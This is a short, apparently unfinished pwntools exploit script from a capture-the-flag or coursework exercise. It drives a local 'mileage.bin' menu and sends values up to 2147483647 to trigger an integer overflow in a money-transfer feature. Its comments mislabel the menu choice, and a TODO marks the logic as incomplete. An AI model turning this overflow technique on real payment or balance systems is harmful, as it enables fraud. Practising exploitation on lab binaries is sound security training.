#!/usr/bin/python3

from pwn import *


def exploit():
    # TODO: Fill in the remaining exploit logic.
    p = process("./mileage.bin")

    # Read in the menu messages.
    for i in range(6):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))

    p.sendline(b"2") # Choose "1. Send money" 
    print(p.recvline())
    p.sendline(b"3000")
    print(p.recvline())
    p.sendline(b"0")
    for i in range(5):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))
    p.sendline(b"2") # Choose "1. Send money" 
    print(p.recvline())
    p.sendline(b"2147483647")
    print(p.recvline())
    p.sendline(b"2")
    print(p.recvline())
    print(p.recvline())    
    print(p.recvline())
if __name__ == "__main__":
    exploit()
